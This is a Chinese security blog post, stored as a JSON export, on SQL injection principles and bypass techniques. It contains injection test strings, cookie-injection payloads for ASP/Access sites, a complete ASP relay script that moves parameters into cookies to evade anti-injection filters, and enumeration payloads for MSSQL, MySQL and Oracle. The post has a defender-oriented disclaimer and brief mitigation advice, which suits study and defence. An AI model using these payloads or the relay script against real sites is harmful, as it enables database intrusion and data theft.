{"title":"SQL注入原理分析与绕过案例.md","slug":"网安大类/OWASPTOP/SQLInject/SQL注入原理分析与绕过案例","date":"2019-03-31T05:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/3-31-382.html","path":"api/articles/2019/3-31-382.html.json","covers":null,"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-数据库分类SQL注入原理分析\"><a href=\"#0x00-数据库分类SQL注入原理分析\" class=\"headerlink\" title=\"0x00 数据库分类SQL注入原理分析\"></a>0x00 数据库分类SQL注入原理分析</h4><h5 id=\"0-SQL测试语句\"><a href=\"#0-SQL测试语句\" class=\"headerlink\" title=\"0.SQL测试语句\"></a>0.SQL测试语句</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 检测语句</span><br><span class=\"line\">and 1 &#x3D; 1 # 不用说了,大家都明白</span><br><span class=\"line\">xor 1 &#x3D; 2 # 异或,此时正常返回数据</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 注入判断</span><br><span class=\"line\">and exists(select * from [admin])  #判断admin表段是否存在</span><br><span class=\"line\">and (select count(*) from [admin])</span><br></pre></td></tr></table></figure>\n<h5 id=\"1-ACCESS数据库\"><a href=\"#1-ACCESS数据库\" class=\"headerlink\" title=\"1.ACCESS数据库\"></a>1.ACCESS数据库</h5><p><strong>1) Cookie中转注入原理</strong><br>cookie注入的形成有两个必须条件：</p>\n<ul>\n<li>条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</li>\n<li>条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</li>\n</ul>\n<p>做过ASP开发的大佬们都知道,Request.QueryString (GET) 或 Request.Form (POST) 用于读取用户发给WEB服务器的指定键中的值,但是有时候在开发时直接使用了Request()对象。<br>如：ID=Request(“ID”) , 如果未对cookie进行过滤这将会导致SQL风险;通过asp的Request对象使用文档知道 ASP WEB服务是怎样读取数据的,它是先取GET中的数据，没有再取POST中的数据,<em>还会去取Cookies中的数据</em>;</p>\n<p>一般的防注入系统,会检测GET和POST中的数据，如果有特殊字符(这里当然是注入字符了)!就禁止数据的提交, 但是由于他没有检测Cookies的数据！问题就来了~~~<br>比如：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL Cookies 中断注入点：http://weiyigeek.xxx/index.asp?ID=1024  <span class=\"comment\">--#加载网页,显示正常</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://weiyigeek.xxx/index.asp  <span class=\"comment\">--#加载网页,显示不正常（没有输参数的原因)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--#下面我们以手动测试为例</span></span><br><span class=\"line\">1.打开浏览器的js控制台</span><br><span class=\"line\">&gt; document.cookie=\"ID=1024\"     --#重新加载网页,显示正常</span><br><span class=\"line\"></span><br><span class=\"line\">2.进行SQL注入测试判断</span><br><span class=\"line\">&gt; avascript:alert(document.cookie=\"id=\"+escape(\"123 and 3=3\"));</span><br><span class=\"line\">&gt; avascript:alert(document.cookie=\"id=\"+escape(\"123 and 3=4\"));</span><br><span class=\"line\">&gt; avascript:alert(document.cookie=\"id=\"+escape(\"123 order by n\"));  --#拆解有几个字段数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">3.可以采用中转注入工具进行注入中转。</span><br><span class=\"line\">其实就是启动一个ASP解析服务器,然后生成一个本地的asp文件来转发get请求写入到COOKIE列表,然后提交给被攻击的网站中,即中转注入。</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">JmdcwName=request(\"jmdcw\")</span><br><span class=\"line\">JmdcwName=escape(JmdcwName)</span><br><span class=\"line\">JmStr=\"Name=123&amp;ID=\"&amp;JmdcwName</span><br><span class=\"line\">JMUrl=\"http://127.0.0.1/目录/注入页.asp\"  '注入点</span><br><span class=\"line\">JmRef=\"http://127.0.0.1/6kbbs/bank.asp\"  '来源页</span><br><span class=\"line\">JmCok=\"ASPSESSIONIDAQACTAQB=HKFHJOPDOMAIKGMPGBJJDKLJ;\"</span><br><span class=\"line\">JmCok=JmCok &amp; \";\" &amp; Jmstr &amp;\";\"</span><br><span class=\"line\">JmCok=URLEncoding(JmCok)</span><br><span class=\"line\">JmStr=\"jmdcw=00\"   '注入参数</span><br><span class=\"line\">response.write    PostData(JMUrl,JmStr,JmCok,JmRef)</span><br><span class=\"line\"></span><br><span class=\"line\">Function PostData(PostUrl,PostStr,PostCok,PostRef)  </span><br><span class=\"line\">Dim Http</span><br><span class=\"line\"><span class=\"keyword\">Set</span> <span class=\"keyword\">Http</span> = Server.CreateObject(<span class=\"string\">\"msxml2.serverXMLHTTP\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">With</span> <span class=\"keyword\">Http</span></span><br><span class=\"line\"></span><br><span class=\"line\">.Open <span class=\"string\">\"POST\"</span>,PostUrl,<span class=\"literal\">False</span></span><br><span class=\"line\">.SetRequestHeader <span class=\"string\">\"Content-Length\"</span>,<span class=\"keyword\">Len</span>(PostStr)</span><br><span class=\"line\">.SetRequestHeader <span class=\"string\">\"Content-Type\"</span>,<span class=\"string\">\"application/x-www-form-urlencoded\"</span></span><br><span class=\"line\">.SetRequestHeader <span class=\"string\">\"Referer\"</span>,PostRef</span><br><span class=\"line\">.SetRequestHeader <span class=\"string\">\"Cookie\"</span>,PostCok</span><br><span class=\"line\">.Send PostStr</span><br><span class=\"line\">PostData = .ResponseBody</span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">With</span></span><br><span class=\"line\"><span class=\"keyword\">Set</span> <span class=\"keyword\">Http</span> = <span class=\"keyword\">Nothing</span></span><br><span class=\"line\">PostData =bytes2BSTR(PostData)</span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">Function</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Function</span> bytes2BSTR(vIn)</span><br><span class=\"line\">Dim strReturn</span><br><span class=\"line\">Dim I, ThisCharCode, NextCharCode</span><br><span class=\"line\">strReturn = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">For</span> I = <span class=\"number\">1</span> <span class=\"keyword\">To</span> LenB(vIn)</span><br><span class=\"line\">ThisCharCode = AscB(MidB(vIn, I, <span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"keyword\">If</span> ThisCharCode &lt; &amp;H80 <span class=\"keyword\">Then</span></span><br><span class=\"line\">strReturn = strReturn &amp; <span class=\"keyword\">Chr</span>(ThisCharCode)</span><br><span class=\"line\"><span class=\"keyword\">Else</span></span><br><span class=\"line\">NextCharCode = AscB(MidB(vIn, I + <span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">strReturn = strReturn &amp; <span class=\"keyword\">Chr</span>(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))</span><br><span class=\"line\">I = I + <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">If</span></span><br><span class=\"line\"><span class=\"keyword\">Next</span></span><br><span class=\"line\">bytes2BSTR = strReturn</span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">Function</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Function</span> URLEncoding(vstrin)</span><br><span class=\"line\">strReturn=<span class=\"string\">\"\"</span></span><br><span class=\"line\">Dim i</span><br><span class=\"line\"><span class=\"keyword\">For</span> i=<span class=\"number\">1</span> <span class=\"keyword\">To</span> <span class=\"keyword\">Len</span>(vstrin)</span><br><span class=\"line\">ThisChr=<span class=\"keyword\">Mid</span>(vstrin,i,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">Abs</span>(<span class=\"keyword\">Asc</span>(ThisChr))&lt; &amp;HFF <span class=\"keyword\">Then</span></span><br><span class=\"line\">strReturn=strReturn &amp; ThisChr</span><br><span class=\"line\"><span class=\"keyword\">Else</span></span><br><span class=\"line\">InnerCode=<span class=\"keyword\">Asc</span>(ThisChr)</span><br><span class=\"line\"><span class=\"keyword\">If</span> InnerCode&lt;<span class=\"number\">0</span> <span class=\"keyword\">Then</span></span><br><span class=\"line\">InnerCode=InnerCode + &amp;H10000</span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">If</span></span><br><span class=\"line\">Hight1=(InnerCode <span class=\"keyword\">And</span> &amp;HFF00) \\&amp;HFF</span><br><span class=\"line\">Low1=InnerCode <span class=\"keyword\">And</span> &amp;HFF</span><br><span class=\"line\">strReturn=strReturn &amp; <span class=\"string\">\"%\"</span> &amp; <span class=\"keyword\">Hex</span>(Hight1) &amp; <span class=\"string\">\"%\"</span> &amp; <span class=\"keyword\">Hex</span>(Low1)</span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">if</span></span><br><span class=\"line\"><span class=\"keyword\">Next</span></span><br><span class=\"line\">strReturn=<span class=\"keyword\">Replace</span>(strReturn,<span class=\"keyword\">chr</span>(<span class=\"number\">32</span>),<span class=\"string\">\"%20\"</span>) <span class=\"string\">'转换空格,如果网站过滤了空格,尝试用/**/来代替%20</span></span><br><span class=\"line\"><span class=\"string\">strReturn=Replace(strReturn,chr(43),\"%2B\")    '</span>JMDCW增加转换+字符 <span class=\"string\">'strReturn=Replace(strReturn,过滤字符,\"转换为字符\") 在此增加要过滤的代码</span></span><br><span class=\"line\"><span class=\"string\">URLEncoding=strReturn</span></span><br><span class=\"line\"><span class=\"string\">End Function</span></span><br><span class=\"line\"><span class=\"string\">%&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><em>提示：</em> 如果程序员是用 Request.QueryString 或 Request.Form 获取数据的话，是无法利用Cookies绕过防注入系统进行注入的，因为服务程序是直截从GET或POST中读取数据的，Cookies是否有数据,WEB服务器是不理的,所以就无法利用了！~<br><em>防御：</em> 1.不要直接使用Request()对象 ; 2.非要使用必须进行Cookie数据进行验证。</p>\n<h5 id=\"2-mssql-数据库\"><a href=\"#2-mssql-数据库\" class=\"headerlink\" title=\"2.mssql 数据库\"></a>2.mssql 数据库</h5><p>MSSQL的SQL注入附录：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#枚举数据库：</span><br><span class=\"line\">获取当前用户名 id&#x3D;12 union select null, null, user, null from master..sysdatabases</span><br><span class=\"line\">获取数据库列表 id&#x3D;12 union select null, null, name,null from master..sysdatabases</span><br><span class=\"line\">获取当前数据库名 id &#x3D;12 union select null,null,db_name(),null from master..sysdatabases;</span><br><span class=\"line\">获取表名： Id&#x3D;12 union select null,null,name,null from sysobjects where xtype&#x3D;&#39;u&#39;</span><br><span class=\"line\">获取字段名： Id &#x3D;12 union select null,null,col_name(object_id(&#39;table_name&#39;), 1), null from sysobjects</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"3-mysql-数据库\"><a href=\"#3-mysql-数据库\" class=\"headerlink\" title=\"3.mysql 数据库\"></a>3.mysql 数据库</h5><p>MYSQL的SQL注入附录：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#系统信息</span><br><span class=\"line\">union all select @@global.version_compile_os from mysql.user &#x2F;*</span><br><span class=\"line\"></span><br><span class=\"line\">#数据库信息</span><br><span class=\"line\">Select user() &#x2F; version() &#x2F; database()   #获取当前用户&#x2F;版本&#x2F;数据库 </span><br><span class=\"line\">Select schema_name from information_schema.schemata #获取数据库列表</span><br><span class=\"line\">Select table_name from information_schema.tables where table_schema&#x3D;&#39;current_db&#39;   #获取表名</span><br><span class=\"line\">SELECT COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;tablename&#39;  #获取字段名</span><br><span class=\"line\"></span><br><span class=\"line\">and ord(mid(user(),1,1)) &#x3D; 114 &#x2F;*  #数据库权限判断,返回正常说明是Root</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"4-oracle-数据库\"><a href=\"#4-oracle-数据库\" class=\"headerlink\" title=\"4.oracle 数据库\"></a>4.oracle 数据库</h5><p>ORACLE的SQL注入附录：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#Oracle只能访问一个数据库,无法枚举数据库</span><br><span class=\"line\">获取当前用户表名：select table_name from user_tables</span><br><span class=\"line\">获取所有表名及拥有者 select owner, table_name from all_tables</span><br><span class=\"line\">获取字段名 select column_name from user_tab_columns where table_name&#x3D;&#39;table&#39;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"0x01-SQL注入实例\"><a href=\"#0x01-SQL注入实例\" class=\"headerlink\" title=\"0x01 SQL注入实例\"></a>0x01 SQL注入实例</h4><h4 id=\"0x02-SQL绕过案例\"><a href=\"#0x02-SQL绕过案例\" class=\"headerlink\" title=\"0x02 SQL绕过案例\"></a>0x02 SQL绕过案例</h4><p>1) 常用绕过技巧列表<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. GET -&gt; POST 绕过 或者 POST -&gt; GET 请求</span><br><span class=\"line\">2. Cookies 注入 或者 中转注入</span><br></pre></td></tr></table></figure></p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"绕过技术","path":"api/categories/绕过技术.json"},{"name":"黑防","path":"api/categories/黑防.json"}],"tags":[{"name":"SQL注入","path":"api/tags/SQL注入.json"}]}